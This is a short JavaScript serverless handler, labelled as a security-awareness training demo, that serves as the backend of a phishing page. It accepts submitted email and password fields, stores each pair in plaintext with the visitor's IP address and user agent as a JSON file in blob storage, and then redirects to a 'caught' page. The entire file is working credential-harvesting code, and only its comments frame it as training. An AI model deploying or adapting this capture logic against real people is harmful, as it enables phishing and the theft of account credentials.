// ============================================================
// SECURITY AWARENESS TRAINING DEMO
// Captures form submissions and stores them as PRIVATE JSON
// files in Vercel Blob. Only the dashboard (via /api/captured)
// can read them, using the server-side BLOB_READ_WRITE_TOKEN.
// ============================================================

import { put } from '@vercel/blob';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body || {};

  const entry = {
    email: email || '(empty)',
    password: password || '(empty)',
    timestamp: new Date().toISOString(),
    ip: req.headers['x-forwarded-for'] || 'unknown',
    userAgent: req.headers['user-agent'] || 'unknown'
  };

  try {
    const safeTs = entry.timestamp.replace(/[:.]/g, '-');
    const random = Math.random().toString(36).slice(2, 8);
    const filename = `captures/${safeTs}-${random}.json`;

    await put(filename, JSON.stringify(entry), {
      access: 'private',
      contentType: 'application/json',
      addRandomSuffix: false,
    });

    console.log('[TRAINING DEMO] Capture stored:', filename);
  } catch (err) {
    console.error('[TRAINING DEMO] Blob write error:', err);
  }

  res.writeHead(302, { Location: '/caught.html' });
  res.end();
}
